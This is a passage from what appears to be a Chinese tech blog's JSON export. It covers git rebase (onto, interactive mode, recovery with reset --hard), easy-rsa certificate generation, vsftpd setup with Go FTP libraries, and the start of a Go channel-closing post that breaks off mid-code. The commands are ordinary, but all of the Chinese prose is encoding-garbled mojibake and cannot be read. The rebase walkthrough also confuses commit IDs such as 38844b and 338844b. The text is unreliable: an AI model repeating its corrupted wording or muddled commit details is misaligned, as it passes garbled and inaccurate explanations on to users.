é¦–å…ˆï¼Œdevelopçš„æ—¥å¿—å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\næ¥ç€ï¼Œfeature-açš„æ—¥å¿—å¦‚ä¸‹æ‰€ç¤º:\n\n```\ncommit 15bf9c8954633700211f5b9d246ae67d8135cf29\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\næœ€åæ˜¯feature-bçš„æ—¥å¿—ï¼š\n\n```\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\nå¯ä»¥çœ‹åˆ°feature-aä¸feature-båˆ†åˆ«æ¯”developå¤šå‡ºäº†1, 2ä¸ªæäº¤ã€‚\n\n\n\nèº«ä¸ºä¸€åä¸“ä¸šçš„team leaderï¼Œæˆ‘ä»¬æœ‰ç€è¶³å¤Ÿçš„ä¿¡å¿ƒï¼Œç›¸ä¿¡è¿™2ä¸ªåˆ†æ”¯è¿ä½œçš„å¾ˆå¥½ï¼Œå› æ­¤æˆ‘ä»¬ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œrebaseã€‚\n\n```\n$ git checkout develop\n$\n$ git rebase feature-a\nFirst, rewinding head to replay your work on top of it...\nFast-forwarded develop to feature-a.\n$\n$ git rebase feature-b\nFirst, rewinding head to replay your work on top of it...\nApplying: add feature_a.c\n```\n\nåœ¨ä¸Šè¿°æŒ‡ä»¤ä¸­ï¼Œæˆ‘ä»¬å…ˆåˆ‡æ¢åˆ°developåˆ†æ”¯ä¸­ï¼Œæ¥ç€æˆ‘ä»¬å¾ˆå¿«çš„å°±åˆ©ç”¨æŒ‡ä»¤git rebase <newbase>åˆå¹¶äº†feature-aä¸feature-bã€‚æ­¤å¤–ï¼Œåœ¨ä¸Šè¿°çš„æŒ‡ä»¤æ‰§è¡Œç»“æœä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸€è¡Œè®¯æ¯æ˜¾ç¤ºFast-forwarded develop to feature-aï¼Œå…¶ä¸­çš„Fast-forwardedæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ\n\n> Fast-forwardedæŒ‡çš„å°±æ˜¯å½“2ä¸ªåˆ†æ”¯çš„å¤´å°¾ç›¸æ¥æ—¶ï¼Œä»£è¡¨2è€…ä¹‹é—´ä¸ä¼šæœ‰conflict ï¼Œå› æ­¤åªè¦æ”¹HEADçš„æŒ‡å‘å°±èƒ½å¤Ÿè¿…é€Ÿåˆå¹¶äº†ã€‚ä»¥æœ¬æƒ…å¢ƒä¸ºä¾‹ï¼Œdevelopçš„æœ€åä¸€ä¸ªæäº¤æ­£å¥½æ˜¯feature-açš„å¤´ï¼Œæ‰€ä»¥è¿™ä¸¤è€…çš„rebaseé€‚ç”¨Fast-forwardedæ¨¡å¼ã€‚\n\næ¥ä¸‹æ¥ï¼Œå¯ä»¥ç”¨git logçœ‹çœ‹developçš„æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥ä»æ—¥å¿—ä¸­å‘ç°feature-aä¸feature-bçš„commit IDéƒ½ä¸ä¸€æ ·äº†ã€‚\n\n```\n$ git log\ncommit 07ef0b8e0b1edd079fb8b69f6e6e215725b5aba4\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\nä»¥ä¸Šå°±æ˜¯æœ€ç®€å•çš„rebaseè¿‡ç¨‹ã€‚\n\nä½†æ˜¯åœ¨è¿™è¿‡ç¨‹ä¸­ï¼Œæœ‰äº›äººå¯èƒ½äº§ç”Ÿäº†å‡ ä¸ªç–‘é—®â€”â€”ã€Œä¸ºä»€ä¹ˆå…ˆrebase feature-aå†rebase feature-båï¼Œä¼šæ˜¯feature-açš„æ—¥å¿—åœ¨æœ€ä¸Šæ–¹å‘¢ï¼Ÿã€\n\nè¿™æ˜¯ç”±äºrebaseä¼šå…ˆæ‰¾å‡ºä¸newbaseä¹‹é—´æœ€è¿‘çš„ä¸€ä¸ªå…±åŒbaseï¼Œç„¶åå…ˆä¿ç•™HEADæ‰€åœ¨åˆ†æ”¯(ä¹Ÿå°±æ˜¯å½“å‰åˆ†æ”¯)ä»å…±åŒbaseå¼€å§‹çš„æ‰€æœ‰å˜æ›´ï¼Œæ¥ç€ä»å…±åŒbaseå¼€å§‹ï¼Œå°†newbaseçš„å˜æ›´é‡æ–°å¥—ç”¨åˆ°HEADçš„æ‰€åœ¨åˆ†æ”¯åï¼Œå†å°†æ–¹æ‰æ‰€ä¿ç•™çš„å½“å‰åˆ†æ”¯å˜æ›´ä¸€ä¸ªä¸€ä¸ªå¥—ç”¨è¿›æ¥ï¼Œä¹Ÿå› æ­¤feature-aä¼šæ˜¯æœ€åçš„ä¸€ä¸ªcommitã€‚\n\n\n\næˆ‘ä»¬ä¸€æ ·ä»¥å›¾ç¤ºè¿›è¡Œè¯´æ˜ã€‚ä¸‹å›¾**After rebase feature-a**æ˜¯rebase feature-aä¹‹åçš„æ ·å­ï¼Œå¯ä»¥çœ‹åˆ°rebase feature-aä¹‹ådevelopä¸feature-bçš„å…±åŒbaseæ˜¯commit 38844bï¼Œå› æ­¤å¦‚æœè¦å†rebase feature-bçš„è¯ï¼Œcommit 15bf9cä¼šå…ˆè¢«æš‚å­˜èµ·æ¥ï¼Œå…ˆè¿›è¡Œrebase feature-bä¹‹åï¼Œå†å°†åˆšåˆšæš‚å­˜çš„commit 38844bé‡æ¼”ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨å›¾**After rebase feature-b**ä¸­feature-açš„commit IDå°±ä»338844bå˜æˆ07ef0bï¼Œè¿™å°±æ˜¯rebaseçš„è¿‡ç¨‹äº†ã€‚\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/3.png)\n\nAfter rebase feature-a\n\n\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/4.png)\n\nAfter rebase feature-b\n\n\n\n\n\né—®é¢˜åˆæ¥äº†ï¼Œåˆšåˆšå­¦çš„rebaseä¼šå°†æ•´ä¸ªåˆ†æ”¯éƒ½æ¥ä¸Šå»ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬ä¸éœ€è¦æ•´ä¸ªåˆ†æ”¯éƒ½æ¥ä¸Šå»ï¼Œåªè¦æ¥åˆ°åˆ†æ”¯ä¸Šçš„æŸä¸ªæäº¤çš„ç‚¹å³å¯ï¼Œè¿™ç§æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨rebase â€“ ontoè¿›è¡Œã€‚\n\nå‡è®¾åªéœ€è¦æ¥åˆ°feature-bçš„commit eb6436æ—¶ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œrebaseï¼š\n\n```\n$ git rebase feature-b --onto eb6436\n```\n\nåˆæˆ–è€…ï¼Œæƒ³è¦æŠŠæˆ‘ä»¬ç°åœ¨çš„åˆ†æ”¯æ•´ä¸ªæ¥åˆ°æŸä¸ªåˆ†æ”¯ç‚¹ä¸Šé¢æ—¶ï¼Œå¯ä»¥é€‰æ‹©å¦ä¸€ç§ç”¨æ³•ï¼š\n\n```\n$ git rebase --onto <new base-commit> <current base-commit>\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬åœ¨feature-båˆ†æ”¯ä¸Šæ—¶ï¼Œæƒ³æŠŠæ•´ä¸ªåˆ†æ”¯æ¥åˆ°commit 3908e6 (initial commit)æ—¶ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š\n\n```\n$ git co feature-b #å…ˆåˆ‡æ¢åˆ°feature-b\n$ git rebase --onto 3908e6 38844b\n```\n\nä¸‹é¢2 å¼ å›¾å°±æ˜¯æ‰§è¡Œä¸Šè¿°æŒ‡ä»¤çš„å‰åå¯¹ç…§ã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/5.png)\n\nbefore rebase â€“onto 3908e6 38844b\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/6.png)\n\nafter rebase â€“onto 3908e6 38844b\n\n\n\n\n\n## Rebase -è¿›é˜¶äº’åŠ¨æ¨¡å¼\n\nRebaseçš„äº’åŠ¨æ¨¡å¼ååˆ†å¼ºå¤§ï¼Œå¯ä»¥å…è®¸æˆ‘ä»¬äº¤æ¢æäº¤çš„æ¬¡åºã€ä¿®æ”¹æäº¤å†…å®¹ã€åˆå¹¶æäº¤å†…å®¹ï¼Œç”šè‡³å°†ä¸€ä¸ªæäº¤æ‹†è§£æˆå¤šä¸ªæäº¤ã€‚\n\nè¦è¿›å…¥äº’åŠ¨æ¨¡å¼çš„åŸºæœ¬æŒ‡ä»¤å¦‚ä¸‹ï¼Œbase commitå¯ä»¥æ˜¯åˆ†æ”¯ä¸Šçš„ä»»æ„ä¸€ç‚¹ï¼š\n\n```\n$ git rebase -i <base commit>\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³åˆ©ç”¨äº’åŠ¨æ¨¡å¼å°†feature-bä¸Šçš„æäº¤åšä¸€äº›æ•´ç†æ—¶ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›å…¥äº’åŠ¨æ¨¡å¼ï¼š\n\n```\n$ git rebase -i 38844b\n```\n\nä¸Šè¿°æŒ‡ä»¤çš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¸Œæœ›å°†feature-bä»commit 38844bä¹‹åçš„æ‰€æœ‰æäº¤(`ä¸å«commit 38844b `)è¿›è¡Œæ•´ç†ã€‚\n\næ¥ç€å°±ä¼šå‡ºç°ç±»ä¼¼ä»¥ä¸‹çš„è®¯æ¯ï¼š\n\n```\npick 1011f14 add feature_b.c\npick d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\nåœ¨è¿›ä¸€æ­¥æ“ä½œå‰ï¼Œæˆ‘ä»¬å¿…é¡»å¯¹è®¯æ¯ä¸Šçš„å‡ ä¸ªæŒ‡ä»¤(commands)è¿›è¡Œè¯´æ˜ï¼š\n\n| pick:   | ä¿ç•™æ­¤æäº¤                                                   |\n| ------- | ------------------------------------------------------------ |\n| reword: | ä¿®æ”¹æäº¤çš„è®¯æ¯(åªæ”¹æäº¤è®¯æ¯)                                 |\n| edit:   | ä¿ç•™æ­¤æäº¤ï¼Œä½†æ˜¯éœ€è¦åšä¸€äº›ä¿®æ”¹(ä¾‹å¦‚åœ¨ç¨‹å¼é‡Œé¢å¤šåŠ äº›æ³¨è§£)     |\n| squash: | ä¿ç•™æ­¤æäº¤ï¼Œä½†æ˜¯å°†ä¸Šé¢çš„æäº¤ä¸€å¹¶å¹¶å…¥æ­¤æäº¤ï¼Œæ­¤åŠ¨ä½œä¼šæ˜¾ç¤ºæäº¤è®¯æ¯ä¾›äººç¼–è¾‘ |\n| fixup:  | ä¸squashç›¸ä¼¼ï¼Œä½†æ˜¯æ­¤æäº¤çš„æäº¤è®¯æ¯ä¼šè¢«ä¸Šé¢çš„æäº¤è®¯æ¯å–ä»£     |\n| exec:   | æ‰§è¡ŒshellæŒ‡ä»¤ï¼Œä¾‹å¦‚**exec make test**è¿›è¡Œä¸€äº›æµ‹è¯•ï¼Œå¯ä»¥éšæ„ç©¿æ’åœ¨æäº¤ç‚¹ä¹‹é—´ |\n\n### å˜æ¢é¡ºåº\n\næ¥ä¸‹æ¥ï¼Œç®€å•ç¤ºèŒƒå˜æ¢æäº¤çš„é¡ºåºï¼Œæ­¤å¤„æˆ‘ä»¬æƒ³æŠŠæäº¤çš„é¡ºåºå˜æˆå…ˆcommit 1011f14å†æ¥æ‰æ˜¯commit d26076aï¼Œæˆ‘ä»¬åªè¦ç®€å•å°†ä¸Šè¿°çš„rebaseè®¯æ¯æ¢æˆå¦‚ä¸‹çš„è®¯æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸¤è¡Œäº’æ¢å³å¯ï¼Œå°±èƒ½å¤Ÿå˜æ¢é¡ºåºäº†ï¼\n\n```\n# æ­¤å¤„è°ƒæ¢æ¬¡åºå³å¯\npick d26076a add #include <stdio.h>\npick 1011f14 add feature_b.c\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n### ä¿®æ”¹æäº¤å†…å®¹\n\næœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬æäº¤ä¹‹åï¼Œä¸å…ä¼šæ³¨è§£å¿˜äº†åŠ æˆ–æ˜¯ç¨‹å¼å†…è¿˜æœ‰æµ‹è¯•çš„codeå¿˜è®°æ¸…æ‰ã€‚è¿™æ—¶å€™é™¤äº†ç”¨git reset â€“soft HEAD^ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨rebaseç¼–è¾‘é‚£äº›éœ€è¦ä¿®æ­£çš„æäº¤ã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨rebaseåœ¨commit 1011f14ä¸­æ·»åŠ å‡ ä¸ªæäº¤ï¼Œå°±å¯ä»¥å°†pickæ”¹æˆeditè¿›å…¥ç¼–è¾‘çŠ¶æ€ã€‚\n\n```\npick 1011f14 add feature_b.c\nedit d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\næ¥ä¸‹æ¥ï¼Œå¦‚æœç”¨git statuså°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­£åœ¨rebaseçš„è®¯æ¯ï¼š\n\n```\n$ git status\nrebase in progress; onto 38844ba\nYou are currently editing a commit while rebasing branch 'Feature-B' on '38844ba'.\n  (use \"git commit --amend\" to amend the current commit)\n  (use \"git rebase --continue\" once you are satisfied with your changes)\n\nnothing to commit, working directory clean\n```\n\n**å¦‚æœä½ åªæ˜¯æƒ³ä¿®æ­£æäº¤è®¯æ¯**ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š\n\n```\n$ git commit --amend\n```\n\n**å¦‚æœä½ éœ€è¦å¤šå¢åŠ å‡ ä¸ªæäº¤ï¼Œç›´æ¥ç¼–è¾‘å§**ï¼Œæ¥ç€ç”¨git add <file> , git commit -m <message>ç­‰ä¸€èˆ¬æ“ä½œè¿›è¡Œã€‚æœ€åå†åˆ©ç”¨ä»¥ä¸‹æŒ‡ä»¤å®Œæˆrebaseï¼š\n\n```\n$ git rebase --continue\n```\n\n**åˆæˆ–è€…ï¼Œæˆ‘ä»¬ç°åœ¨ç¼–è¾‘çš„æäº¤å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå¯èƒ½å¯¹ç¨‹å¼ç å®¡æŸ¥çš„äººé€ æˆå›°æ‰°ï¼Œä¾‹å¦‚åŒæ—¶ä¿®æ­£å¤ªå¤šä¸ªæ¡£æ¡ˆï¼Œæˆ‘ä»¬å¸Œæœ›æ‹†æˆæ¯”è¾ƒæ˜ç¡®çš„å¤šä¸ªæäº¤**ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤å›åˆ°æœªæäº¤å‰çš„çŠ¶æ€ï¼š\n\n```\n$ git reset HEAD^\n```\n\nç„¶åå°±å¯ä»¥ç”¨git statusåˆ—å‡ºè¿™ä¸ªæäº¤ä¸­å˜æ›´äº†å¤šå°‘æ¡£æ¡ˆï¼Œç„¶åä¾ç…§éœ€æ±‚ä¸€ä¸ªä¸€ä¸ªç”¨git addåŠ è¿›å»åæäº¤ï¼Œå¤šæäº¤ä¸ªå‡ æ¬¡ï¼Œå°±ç­‰äºæ˜¯å°†ä¸€ä¸ªæäº¤æ‹†æˆå¤šä¸ªæäº¤å•°ï¼ä¸è¿‡åˆ«å¿˜äº†ï¼Œè¦ç”¨ä»¥ä¸‹æŒ‡ä»¤ç»“æŸrebaseã€‚\n\n```\n$ git rebase --continue\n```\n\nä»¥ä¸Šå°±æ˜¯rebaseçš„å‡ ä¸ªç®€å•è¯´æ˜ä¸æ“ä½œã€‚\n\nè‡³äºsquash , fixupä»¥åŠexecå°±ç•™ç»™å„ä½å»ä½“éªŒäº†ï¼\n\n\n\n## Rebaseå‡ºç°é—®é¢˜æ—¶çš„å¤„ç†æ–¹æ³•\n\nRebaseä¸mergeä¸€æ ·éƒ½å¯èƒ½ä¼šäº§ç”Ÿ**conflict**ï¼Œè¿™æ—¶å€™é™¤äº†ä¿®æ­£**conflict**ä¹‹åå†ç”¨git add <file> , git rebase â€“continueå®Œæˆrebaseä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨git rebase â€“abortç›´æ¥æ”¾å¼ƒrebaseã€‚\n\n```\ngit rebase (--continue | --abort | --skip)\n```\n\næ­¤å¤–ï¼Œå¯¹äºrebaseä½¿ç”¨ä¸æ…æ—¶ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›èƒ½å¤Ÿç›´æ¥å›å¤åˆ°rebaseä¹‹å‰çš„çŠ¶æ€ï¼Œä»¥ä¸‹å°±æ˜¯å‡ ä¸ªæŒ‡ä»¤å¯ä»¥ç”¨æ¥å›å¤åˆ°rebaseä¹‹å‰çš„çŠ¶æ€ã€‚å‚è€ƒè‡ª[StackOverFlow](http://stackoverflow.com/questions/134882/undoing-a-git-rebase)ã€‚\n\nå›å¤æ–¹æ³•1 ï¼š\n\n```\n# æœ€ç®€å•çš„ç”¨æ³•\n$ git reset --hard ORIG_HEAD\n```\n\nå›å¤æ–¹æ³•2 ï¼š\n\n```\n# rebase ä¹‹å‰å…ˆä¸Štag\n$ git tag BACKUP\n$ ... # rebase è¿‡ç¨‹\n$ ... # rebase è¿‡ç¨‹\n$ git reset --hard BACKUP # å¤±è´¥çš„è¯å¯ä»¥ç›´æ¥å›å¤åˆ°tag BACKUP\n```\n\nå›å¤æ–¹æ³•3 ï¼š\n\n```\n$ git reflog # å¯»æ‰¾è¦å›å¤çš„HEAD ï¼Œä»¥ä¸‹å‡è®¾æ˜¯HEAD@{3}\n$ git reset --hard HEAD@{3} # å›å¤\n```","tags":["git"],"categories":["git"]},{"title":"ä½¿ç”¨esayrsaç”Ÿæˆsslè¯ä¹¦","url":"%2Fp%2Fdf25a0d8.html","content":"\n### ä¸‹è½½releaseç‰ˆæœ¬\n\nhttps://github.com/OpenVPN/easy-rsa/releases\n\n### é…ç½®å…¬é’¥åŸºç¡€è®¾æ–½å˜é‡\n\n```\ncp vars.example vars\nvim vars\n```\n\nä¿®æ”¹å†…å®¹ç¤ºä¾‹\n\n```\nset_var EASYRSA_REQ_COUNTRY \"CN\"\nset_var EASYRSA_REQ_PROVINCE \"BeiJing\"\nset_var EASYRSA_REQ_CITY \"BeiJing\"\nset_var EASYRSA_REQ_ORG \"Wise Innovation Inc.\"\nset_var EASYRSA_REQ_EMAIL \"user@mail.com\"\nset_var EASYRSA_REQ_OU \"Wise Innovation\"\n```\n\n<!-- more -->\n\n### åˆå§‹åŒ– easyrsa\n\n1. åˆå§‹åŒ–\n\n```\n./easyrsa init-pki      # pki/{reqs,private} dir\n```\n\n2.  ç”Ÿæˆ crt\n\n\n```\n./easyrsa build-ca      # pki/private/ca.key pki/ca.crt\n```\n\nè¾“å…¥å¯†ç \n\n\nEnter PEM pass phrase:\n\n\nç¡®è®¤å¯†ç \n\n\nVerifying - Enter PEM pass phrase:\n\n\nè¾“å…¥ CA çš„åç§°, å¦‚: Wise Innovation CA\n\n\nCommon Name (eg: your user, host, or server name)[Easy-RSA CA]:\n\n\n\n### ç”Ÿæˆserverè¯ä¹¦ (å› ä¸ºç”¨äº†é€šé…ç¬¦, åœ¨ zsh å¥½åƒæ— æ•ˆ, ç”¨ bash æ‰§è¡Œå‘½ä»¤)\n\n```\n./easyrsa build-server-full *.fhyx.online nopass  //ç”¨bash\n```\n\n\n\n   ### ç”Ÿæˆclientè¯ä¹¦\n\n```\n./easyrsa build-client-full kc-spring-001 nopass \n\n./easyrsa build-client-full kc-box-001 nopass\n```","tags":["easyrsa"],"categories":["https"]},{"title":"linuxå¼€å¯ftpæœåŠ¡å’Œgolangå®ç°ftp_server_client","url":"%2Fp%2Fd43abcbd.html","content":"\n\n\n### linux å®‰è£… ftp æœåŠ¡\n\n1 . å®‰è£…ftp\n\n```\nsudo apt-get install vsftpd\n```\n\n2. ä¿®æ”¹é…ç½®  sudo vi /etc/vsftpd.con\n\n```\nlocal_root=/home/ftpuser\nwrite_enable=YES\nanon_mkdir_write_enable=YES\n```\n\n\n3. æ·»åŠ ftpç”¨æˆ·\n\n```\nmkdir /home/ftpuser\nsudo useradd -d /root/workspace -M ftpuser\nsudo passwd ftpuser\n```\n\n4. è°ƒæ•´æ–‡ä»¶å¤¹æƒé™\n\n```\nchown ftpuser:ftpuser  /home/ftpuser/\nsudo chmod a-w  /home/ftpuser \n```\n\n5. ä¿®æ”¹pam.d/vsftpd\n\n```\nsudo vi /etc/pam.d/vsftpd\n#auth    required pam_shells.so //æ³¨é‡Šæ‰è¿™ä¸€è¡Œ\nsudo service vsftpd restart\n```\n\n6. è¿æ¥\n\n```\nftp://207.246.80.69  //é€šè¿‡æµè§ˆå™¨è®¿é—®\n\nmac å¯ä»¥ä¸‹è½½ filezilla å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥\n```\n\n<!-- more -->\n\n## golang å®ç° ftp-server ftp-client\n\n### server\n\nhttps://github.com/fclairamb/ftpserver \n\n### client\n\nhttps://github.com/secsy/goftp\n\nhttps://github.com/jlaffaye/ftp\n\n### io progress\n\nhttps://github.com/mitchellh/ioprogress\n\n#### æ³¨æ„äº‹é¡¹:\n\n+ æ˜¾ç¤ºè¿›åº¦çš„æ—¶å€™è¦ç¡®å®šæ€»çš„size\n\n+ åœ¨æ˜¾ç¤ºè¿›åº¦çš„æ—¶å€™è¦æ³¨æ„è®¾ç½®æ–­ç‚¹ç»­ä¼ çš„è¿›åº¦\n\n+ åˆ—å‡ºfileçš„åå­—\n\n","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"golangä¼˜é›…çš„å…³é—­channel","url":"%2Fp%2F8b210700.html","content":"\n\n\n### Channelä½¿ç”¨è§„èŒƒ\n\nåœ¨ä¸èƒ½æ›´æ”¹channelçŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ç®€å•æ™®éçš„æ–¹å¼æ¥æ£€æŸ¥channelæ˜¯å¦å·²ç»å…³é—­äº†\n\nå…³é—­å·²ç»å…³é—­çš„channelä¼šå¯¼è‡´panicï¼Œæ‰€ä»¥åœ¨closer(å…³é—­è€…)ä¸çŸ¥é“channelæ˜¯å¦å·²ç»å…³é—­çš„æƒ…å†µä¸‹å»å…³é—­channelæ˜¯å¾ˆå±é™©çš„\n\nå‘é€å€¼åˆ°å·²ç»å…³é—­çš„channelä¼šå¯¼è‡´panicï¼Œæ‰€ä»¥å¦‚æœsender(å‘é€è€…)åœ¨ä¸çŸ¥é“channelæ˜¯å¦å·²ç»å…³é—­çš„æƒ…å†µä¸‹å»å‘channelå‘é€å€¼æ˜¯å¾ˆå±é™©çš„\n\n \n\n### The Channel Closing Principle\n\nåœ¨ä½¿ç”¨Go channelçš„æ—¶å€™ï¼Œä¸€ä¸ªé€‚ç”¨çš„åŸåˆ™æ˜¯*ä¸è¦ä»æ¥æ”¶ç«¯å…³é—­channelï¼Œä¹Ÿä¸è¦å…³é—­æœ‰å¤šä¸ªå¹¶å‘å‘é€è€…çš„channel*ã€‚\n\næ¢å¥è¯è¯´ï¼Œå¦‚æœsender(å‘é€è€…)åªæ˜¯å”¯ä¸€çš„senderæˆ–è€…æ˜¯channelæœ€åä¸€ä¸ªæ´»è·ƒçš„senderï¼Œé‚£ä¹ˆä½ åº”è¯¥åœ¨senderçš„goroutineå…³é—­channelï¼Œä»è€Œé€šçŸ¥receiver(s)(æ¥æ”¶è€…ä»¬)å·²ç»æ²¡æœ‰å€¼å¯ä»¥è¯»äº†ã€‚ç»´æŒè¿™æ¡åŸåˆ™å°†ä¿è¯æ°¸è¿œä¸ä¼šå‘ç”Ÿå‘ä¸€ä¸ªå·²ç»å…³é—­çš„channelå‘é€å€¼æˆ–è€…å…³é—­ä¸€ä¸ªå·²ç»å…³é—­çš„channelã€‚\n\n<!-- more -->\n\n### æ‰“ç ´Channel Closing Principleçš„è§£å†³æ–¹æ¡ˆ \n\n \n\nå¦‚æœä½ å› ä¸ºæŸç§åŸå› ä»æ¥æ”¶ç«¯ï¼ˆreceiver sideï¼‰å…³é—­channelæˆ–è€…åœ¨å¤šä¸ªå‘é€è€…ä¸­çš„ä¸€ä¸ªå…³é—­channelï¼Œé‚£ä¹ˆä½ åº”è¯¥ä½¿ç”¨åˆ—åœ¨[Golang panic/recover Use Cases](https://link.jianshu.com/?t=http://www.tapirgames.com/blog/golang-panic-use-cases)çš„å‡½æ•°æ¥å®‰å…¨åœ°å‘é€å€¼åˆ°channelä¸­ï¼ˆå‡è®¾channelçš„å…ƒç´ ç±»å‹æ˜¯Tï¼‰\n\n \n\n```\nfunc SafeSend(ch chan T, value T) (closed bool) {\n    defer func() {\n        if recover() != nil {\n            // the return result can be altered \n            // in a defer function call\n            closed = true\n        }\n    }()\n    \n    ch <- value // panic if ch is closed\n    return false // <=> closed = false; return\n}\n```\n\n \n\nåŒæ ·çš„æƒ³æ³•ä¹Ÿå¯ä»¥ç”¨åœ¨ä»å¤šä¸ªgoroutineå…³é—­channelä¸­ï¼š\n\n\n\n```\nfunc SafeClose(ch chan T) (justClosed bool) {\n\tdefer func() {\n\t\tif recover() != nil {\n\t\t\tjustClosed = false\n\t\t}\n\t}()\n\t\n\t// assume ch != nil here.\n\tclose(ch) // panic if ch is closed\n\treturn true // <=> justClosed = true; return\n}\n```\n\n\n\nå¾ˆå¤šäººå–œæ¬¢ç”¨`sync.Once`æ¥å…³é—­channelï¼š\n\n```\n type MyChannel struct {\n\tC    chan T\n\tonce sync.Once\n}\n\nfunc NewMyChannel() *MyChannel {\n\treturn &MyChannel{C: make(chan T)}\n}\n\nfunc (mc *MyChannel) SafeClose() {\n\tmc.once.Do(func() 